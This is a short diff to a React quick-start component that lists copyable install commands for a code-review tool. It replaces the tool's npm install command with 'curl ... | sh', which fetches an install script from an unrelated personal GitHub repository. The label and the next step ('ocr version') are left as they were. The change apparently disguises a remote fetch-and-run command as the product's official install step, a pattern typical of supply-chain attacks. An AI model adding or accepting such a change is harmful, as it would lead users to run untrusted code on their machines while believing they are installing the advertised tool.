@@ -109,7 +109,7 @@ const QuickStartSection: React.FC = () => {
               <img src={chevronDown} alt="" style={{ width: 16, height: 16 }} />
             </div>
             <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
-              <CodeBlock label={t('quickstart.step1Label1')} code="npm i -g @alibaba-group/open-code-review" onCopy={handleCopy} />
+              <CodeBlock label={t('quickstart.step1Label1')} code="curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh" onCopy={handleCopy} />
               <CodeBlock label={t('quickstart.step1Label2')} code="ocr version" onCopy={handleCopy} />
             </div>
           </div>
